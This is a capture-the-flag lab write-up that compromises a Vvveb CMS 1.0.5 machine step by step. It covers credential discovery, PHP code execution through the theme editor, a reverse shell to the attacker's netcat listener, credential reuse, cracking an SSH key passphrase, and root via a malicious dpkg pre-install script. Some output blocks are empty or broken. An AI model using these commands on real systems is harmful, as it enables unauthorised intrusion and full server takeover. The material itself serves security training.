## 🔎 Enumeration


First, identify active hosts on the local network using `arp-scan`.

```bash
arp-scan --localnet
```

The target machine was identified as:

```text
$ sudo arp-scan  --localnet                              
sudo: unable to resolve host arc: Name or service not known
[sudo] password for arc:

```

#### Finding

The target IP for further enumeration is:

```text
192.168.1.58
```

---

## 🌐 Network Enumeration

Run an Nmap scan against all TCP ports:

```bash
nmap -p- 192.168.1.58
```

The scan identified two interesting services:

```text
$ nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.58
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-05 06:34 -0700

<img width="1308" height="520" alt="Screenshot_2026-09-05_07_04_49" src="https://github.com/user-attachments/assets/3a3b3fc3-03c3-46c1-9bc5-1cc7dcc8c684" />

Revealed:

```text
Vvveb CMS 1.0.5
```

The `Vvveb CMS 1.0.5` vulnerability is a critical security flaw `(CVE-2025-8518)` that allows 
logged-in administrators or attackers with template-editing privileges to achieve `Remote Code Execution (RCE)`. 
The issue exists because the platform's built-in "`Code Editor`" tool fails to properly check and clean files during the saving process. 
By abusing this flaw, an attacker can inject malicious code directly into the website's files, effectively giving them complete control over the web server.

## 📂 Directory Enumeration


The web root was enumerated using FFUF:

```bash
ffuf -u http://192.168.1.58/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Interesting paths included:

```text

```

The most interesting discovery was:

```text
/admin
/system
```

## 🔐 Vvveb Administration Panel


Navigating to:

```text
http://192.168.1.58/admin
```

<img width="1918" height="859" alt="Screenshot_2026-09-05_08_06_17" src="https://github.com/user-attachments/assets/d184a386-7ba7-4533-b96e-8f2dd48a9489" />

displayed the Vvveb administrator login page.

At this point, administrator credentials were still unknown.

Rather than attempting to brute-force the login immediately, further enumeration of the application was performed.

---

## 🔍 System Directory Enumeration

The `/system` directory was fuzzed:

```bash
ffuf -u http://192.168.1.58/system/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Interesting results included:

```text
$ ffuf -u  http://192.168.1.58/system/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fs 29072 -fc 403

```

The following endpoint was particularly interesting: `/system/secret`

It returned HTTP `200`.

---

## 🧩 Credential Disclosure

The contents were retrieved with:

```bash
curl http://192.168.1.58/system/secret
```

The server returned a Base64-encoded blob:

```text
MDAwMDAwMDAgIDM1IDM5IDIwIDM1IDM3IDIwIDM1IDMyIDIwIDM3IDM0IDIwIDM2IDMxIDIwIDM1ICB8NTkgNTcgNTIgNzQgNjEgNXwKMDAwMDAwMTAgIDM3IDIwIDMzIDM0IDIwIDMzIDM2IDIwIDM2IDMzIDIwIDMzIDMyIDIwIDM0IDY1ICB8NyAzNCAzNiA2MyAzMiA0ZXwKMDAwMDAwMjAgIDIwIDM3IDM2IDIwIDM2IDM0IDIwIDM0IDM4IDIwIDM1IDMyIDIwIDM2IDY1IDIwICB8IDc2IDY0IDQ4IDUyIDZlIHwKMDAwMDAwMzAgIDM2IDMzIDIwIDM2IDY0IDIwIDM1IDM2IDIwIDM2IDYzIDIwIDM2IDMyIDIwIDM2ICB8NjMgNmQgNTYgNmMgNjIgNnwKMDAwMDAwNDAgIDM3IDIwIDMzIDY0IDIwIDMzIDY0ICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8NyAzZCAzZHw=
```

The data appeared to contain multiple encoding layers.

---

### Decode the Secret

The data was decoded using [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Hexdump()From_Hex('Auto')From_Base64('A-Za-z0-9%2B/%3D',true,false ) with the following sequence:

```text
From Base64
     ↓
From Hexdump
     ↓
From Hex
     ↓
From Base64
```

<img width="1540" height="653" alt="Screenshot_2026-09-05_09_35_25" src="https://github.com/user-attachments/assets/8c4a3693-7d3d-4d0d-8635-04cf4f806871" />


The final decoded value was:

```text
Username: admin
Password: scottgreen
```

These credentials were used to authenticate to the Vvveb administration panel.

---

## 💻 Initial Access the Administrator Panel 


Using:

```text
Username: admin
Password: scottgreen
```

the Vvveb administrator panel was successfully accessed.

<img width="1918" height="865" alt="Screenshot_2026-09-05_09_39_53" src="https://github.com/user-attachments/assets/0c3cf90e-22c9-4d01-a1e4-ac5bd60da316" />


The application provided a **Themes → Code Editor** functionality that allowed modification of PHP theme files.

<img width="1918" height="895" alt="Screenshot_2026-09-05_09_41_06" src="https://github.com/user-attachments/assets/2f924d1b-9457-4aeb-bf4c-a24c6bc37567" />

Navigation:

```text

              └── theme.php
```

<img width="1918" height="694" alt="Screenshot_2026-09-05_09_42_16" src="https://github.com/user-attachments/assets/b4de6e69-0fd6-4364-9955-feb9bf07157f" />

Scroll to bottom click on `Edit`.

---

###  Testing Arbitrary PHP Code Execution

The `theme.php` file was modified to test whether PHP code could be executed.

```php
<?php
$file = '/etc/passwd';

if (file_exists($file) && is_readable($file)) {
    $content = file_get_contents($file);
    echo nl2br(htmlspecialchars($content));
} else {
    echo "The file is not readable or does not exist.";
}
?>
```

<img width="1722" height="732" alt="Screenshot_2026-09-05_09_43_37" src="https://github.com/user-attachments/assets/0d879d78-bb67-40f0-af5e-93a8089d4cb7" />


After saving the modification, 

<img width="1918" height="893" alt="Screenshot_2026-09-05_09_43_46" src="https://github.com/user-attachments/assets/b9b5fd38-8dd9-46dd-a7e8-bc10d86725d0" />

Now let's click the `Edit Website` option from the right-side menu and open the `source page` of the site.

<img width="1918" height="811" alt="Screenshot_2026-09-05_09_43_57" src="https://github.com/user-attachments/assets/1726aef8-fe14-473f-9765-a460be88a237" />

The injected PHP code executed successfully and displayed the contents of: `/etc/passwd`

This confirmed **arbitrary PHP code execution** through the authenticated Vvveb code editor.

> This should be described as **arbitrary PHP code execution / Remote Code Execution (RCE)** rather than command injection.

---

## 👤 User Enumeration


The `/etc/passwd` file revealed several local accounts.

Two interesting users were:

```text
bunny
zer0arc4
```

This provided potential targets for further privilege escalation and lateral movement.

---

## 🐚 Reverse Shell


A PHP reverse-shell payload was placed into the same editable PHP file.

On the attacker machine, a Netcat listener was started:

```bash
nc -lnvp 443
```
Now let's follow the same steps we did previously :
```

```text
Themes
  └── Code Editor
        └── landing
              └── theme.php
```
But now let's upload the `Pentestmonkey PHP` reverse shell code from [Revshell.com](https://www.revshells.com/) and save and triggering the modified PHP page.

A reverse shell was received and was running as:


```text
$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.1.28] from (UNKNOWN) [192.168.1.58] 40900
Linux vvveb 6.12.107+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.107-1 (2026-08-29) x86_64 GNU/Linux

sh: 0: can't access tty; job control turned off
$ id ; hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
vvveb
$ 
```

Hostname: `vvveb`

Therefore, initial access was obtained as: `www-data`

---

## 🛠️  Upgrade to a TTY

The initial reverse shell did not have a proper TTY.

A Bash shell was spawned through `script`:

```bash
script /dev/null -c bash
```

Then:

```text
Ctrl + Z
```

Restore the shell with:

```bash
stty raw -echo; fg
```

Reset the terminal:

```bash
reset xterm
```

Set the terminal type:

```bash
export TERM=xterm
```

Set Bash:

```bash
export BASH=bash
```

The shell now behaved like a normal interactive terminal.

---

## 🔐 Local Privilege Enumeration


First:

```bash
sudo -l
```

As `www-data`, sudo required authentication:

```text
$ sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
```

No useful sudo permission was available.

---
Search for Linux Capabilities

```bash
getcap -r / 2>/dev/null
```

No immediately useful capability was identified.

---

Search for SUID Binaries

```bash
find / -type f -perm -4000 2>/dev/null
```

The results included standard SUID binaries:

```text
www-data@vvveb:/$ find / -type f -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
www-data@vvveb:/$ 
```

No direct privilege-escalation path was identified from the SUID enumeration.

---

## 🗄️ Finding credentials in config files.

Since no useful information was found, let's enumerate the system for files that might expose hardcoded credentials, 
API keys, or passwords. During the search, I discovered a file named `db.php` in the `/var/www/vvveb/config directory`.

Let's read its contents.

```bash
cat /var/www/vvveb/config/db.php
```

revealed:

```php 
<?php
 return array (
  'default' => 'mysqli',
  'connections' => 
  array (
    'mysqli' => 
    array (
      'engine' => 'mysqli',
      'host' => '127.0.0.1',
      'database' => 'vvveb',
      'user' => 'bunny',
      'password' => 'buNNy_P@$$w0rd_99',
      'port' => NULL,
      'prefix' => '',
    ),
  ),
);
```

The database credentials were:

```text
Username: bunny
Password: buNNy_P@$$w0rd_99
```

---

## 👤 User Pivot by Credential Reuse - bunny

The discovered password was tested against the local user account:

```bash
su bunny
```

After supplying the discovered password, access was successfully obtained.

Verify the account:

```text
www-data@vvveb:/var/www/vvveb/config$ su bunny
Password: 
bunny@vvveb:/var/www/vvveb/config$ cd
bunny@vvveb:~$ id ; whoami ; hostname
uid=1001(bunny) gid=1001(bunny) groups=1001(bunny),100(users)
bunny
vvveb
```

The credential reuse allowed movement from:

```text
www-data → bunny
```

---

## 🔎 Bunny Enumeration

Check Sudo

```bash
sudo -l
```

The result was:

```text
Sorry, user bunny may not run sudo on vvveb.
```

No sudo privileges were available.

---

Check SUID and Capabilities

SUID enumeration:

```bash
find / -type f -perm -4000 2>/dev/null
```

Capabilities:

```bash
getcap -r / 2>/dev/null
```

Since `bunny` cannot run `sudo` and the `SUID` binaries are standard, you need to check for other local privilege escalation vectors specific to this user.

---

## 🔑 SSH Private Key Disclosure

```bash
ls -la /home/
```

Two user directories were present:

```text
bunny@vvveb:~$ ls -la /home/
total 16
drwxr-xr-x  4 root     root     4096 Sep  4 08:55 .
drwxr-xr-x 19 root     root     4096 Sep  4 11:43 ..
drwx------  3 bunny    bunny    4096 Sep  4 11:44 bunny
drwxr--r-x  4 zer0arc4 zer0arc4 4096 Sep  4 11:43 zer0arc4
```

We have discovered another user on the system named `zer0arc4`. 
Notice that their home directory (`/home/zer0arc4`) has the permissions `drwxr--r-x`, 
meaning it is world-readable and executable. We can enter it and look at its files.

---

Inspect `/home/zer0arc4`

```bash
ls -la /home/zer0arc4
```

Result:

```text
bunny@vvveb:/home/zer0arc4$ ls -la
total 36
drwxr--r-x 4 zer0arc4 zer0arc4 4096 Sep  4 11:43 .
drwxr-xr-x 4 root     root     4096 Sep  4 08:55 ..
-rw------- 1 zer0arc4 zer0arc4   12 Sep  5 09:49 .bash_history
-rw-r--r-- 1 zer0arc4 zer0arc4  220 Sep  4 08:25 .bash_logout
-rw-r--r-- 1 zer0arc4 zer0arc4 3526 Sep  4 08:25 .bashrc
drwx------ 3 zer0arc4 zer0arc4 4096 Sep  4 11:43 .local
-rw-r--r-- 1 zer0arc4 zer0arc4  807 Sep  4 08:25 .profile
drwx---r-x 2 zer0arc4 zer0arc4 4096 Sep  4 11:28 .ssh
-rw------- 1 zer0arc4 zer0arc4   33 Sep  4 11:03 user.txt
bunny@vvveb:/home/zer0arc4$ 
```

While we cannot read the `user.txt` flag yet because it is restricted (`-rw-------`), pivoting to the `zer0arc4` account will grant us access to it.

The `.ssh` folder (`drwx---r-x`) stands out because it is world-executable and world-readable. 
This means we can look inside it to see if there are any exposed SSH keys or configurations.
lets list `.ssh`.

```text
bunny@vvveb:/home/zer0arc4$ ls -la .ssh/
total 20
drwx---r-x 2 zer0arc4 zer0arc4 4096 Sep  4 11:28 .
drwxr--r-x 4 zer0arc4 zer0arc4 4096 Sep  4 11:43 ..
-rw-r--r-- 1 zer0arc4 zer0arc4   96 Sep  4 11:28 authorized_keys
-rw----r-- 1 zer0arc4 zer0arc4  464 Sep  4 11:20 id_ed25519
-rw-r--r-- 1 zer0arc4 zer0arc4   96 Sep  4 11:20 id_ed25519.pub
bunny@vvveb:/home/zer0arc4$ 
```

We have found a critical exposure: the private SSH key `id_ed25519` has the permissions `-rw----r--`, 
meaning it is world-readable [1] (indicated by the final r--). 
We can read this private key and use it to log in directly as `zer0arc4`.

Lets get the private key to our local machine.

---

## 🔓 SSH Key Cracking

Convert the SSH Key for John the Ripper

```bash
ssh2john id_ed25519 > hash.txt
```

The resulting hash then be attacked using John the Ripper:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

We can see that we have successfully cracked the SSH key passphrase.
```
$ john --wordlist=/usr/share/wordlists/rockyou.txt --fork=$(nproc) hash.txt    

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])

```

---

## 🔐 SSH Access as zer0arc4

Before using the private key change the permissions:

```bash
chmod 600 id_ed25519
```

Then connect:

```bash
ssh -i id_ed25519 zer0arc4@192.168.1.58
```
Enter the cracked SSH key passphrase:
```
fromyesterday
```

The SSH connection was successful.

Verify the account:

```bash
id ; whoami ; hostname
```

Output:

```text
$ ssh -i id_ed25519 zer0arc4@192.168.1.58
Enter passphrase for key 'id_ed25519':

## 🚩 User Flag


The user flag was located in the home directory:

```bash
cat user.txt
```

User Flag:

```text
a83ae457efcb06524b5a64aa3b788354
```


---

## 👑 Privilege Escalation

Lets files we can run using `Sudo` as zer0arc4

Run:

```bash
sudo -l
```

The important result was:

```text
zer0arc4@vvveb:~$ sudo -l
Matching Defaults entries for zer0arc4 on vvveb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User zer0arc4 may run the following commands on vvveb:
    (root) NOPASSWD: /usr/bin/dpkg
zer0arc4@vvveb:~$ 
```

This is the critical privilege-escalation vector.

The user could execute: `/usr/bin/dpkg` as `root` without providing a password.

---

## 📦 Exploiting sudo dpkg

We can see that we can run /usr/bin/dpkg as the root user without a password. 
Let's check [GTFOBins](https://gtfobins.org/gtfobins/dpkg/#shell) to find a sudo privilege escalation method for it.

<img width="1918" height="859" alt="Screenshot_2026-09-05_10_42_35" src="https://github.com/user-attachments/assets/3dc2bf68-7379-477e-bd46-ca223ae769a0" />

Create a Malicious Package Script

On the attacker machine, create a script:

```bash
echo 'exec /bin/sh' > x.sh
```

The purpose of this script is to spawn a shell when executed.

---

FPM can be used to construct a Debian package containing custom package lifecycle scripts.

Install the required dependencies:

```bash
sudo apt install ruby ruby-dev rubygems build-essential
```

Then install FPM:

```bash
sudo gem install fpm
```

---

Now lets build the Malicious Debian Package:

```bash
fpm -n x -s dir -t deb -a all --before-install x.sh .
```

FPM generated: `x_1.0_all.deb`

The important option here is:

```text
--before-install x.sh
```

This causes the supplied script to become a Debian package pre-installation script.

---

## 📡 Transfer the Package

On the target machine:

```bash
nc -lnvp 4444 > x_1.0_all.deb
```

From the attacker machine:

```bash
nc 192.168.1.58 4444 < x_1.0_all.deb
```

The package was successfully transferred.

Verify:

```bash
ls -la
```

The target contained:

```text
zer0arc4@vvveb:~$ ls -la
total 68
drwxr--r-x 4 zer0arc4 zer0arc4  4096 Sep  5 13:52 .
drwxr-xr-x 4 root     root      4096 Sep  4 08:55 ..
-rw------- 1 zer0arc4 zer0arc4    12 Sep  5 09:49 .bash_history
-rw-r--r-- 1 zer0arc4 zer0arc4   220 Sep  4 08:25 .bash_logout
-rw-r--r-- 1 zer0arc4 zer0arc4  3526 Sep  4 08:25 .bashrc
drwx------ 3 zer0arc4 zer0arc4  4096 Sep  4 11:43 .local
-rw-r--r-- 1 zer0arc4 zer0arc4   807 Sep  4 08:25 .profile
drwx---r-x 2 zer0arc4 zer0arc4  4096 Sep  4 11:28 .ssh
-rw------- 1 zer0arc4 zer0arc4    33 Sep  4 11:03 user.txt
-rw-rw-r-- 1 zer0arc4 zer0arc4 30404 Sep  5 13:52 x_1.0_all.deb
zer0arc4@vvveb:~$ 
```

---

## 💥 Root Access

Execute dpkg as Root, Because `dpkg` could be executed through sudo without a password:

```bash
sudo dpkg -i x_1.0_all.deb
```

During package installation, the malicious pre-installation script executed.

The resulting shell was:

```text
zer0arc4@vvveb:~$ sudo dpkg -i x_1.0_all.deb
(Reading database ... 45029 files and directories currently installed.)
Preparing to unpack x_1.0_all.deb ...
# id ; whoami; hostname
uid=0(root) gid=0(root) groups=0(root)
root
vvveb
# 
```

Root access was successfully obtained.

---

## 🚩 Root Flag

With root access we can find root flag in:

```bash
cat /root/root.txt
```
Root Flag

```text
9fb613333cf2bde51b1989a0d03a095c
```

## 🧠 Key Takeaways

- Always enumerate CMS versions, as outdated versions can expose known vulnerabilities.
- Sensitive application paths such as `/system/secret` can disclose credentials and other critical information.
- Multi-layer encoded data should be carefully decoded when investigating suspicious application responses.
- Authenticated code editors that allow modification of executable files can lead to arbitrary code execution.
- Hardcoded database credentials in application configuration files can enable local user access through credential reuse.
- SSH private keys must have restrictive permissions, as world-readable keys can expose user accounts.
- Always check `sudo -l`, as misconfigured `NOPASSWD` permissions can provide a direct path to root.
- Privileged package-management utilities such as `dpkg` can be abused to execute arbitrary commands as root when improperly restricted.
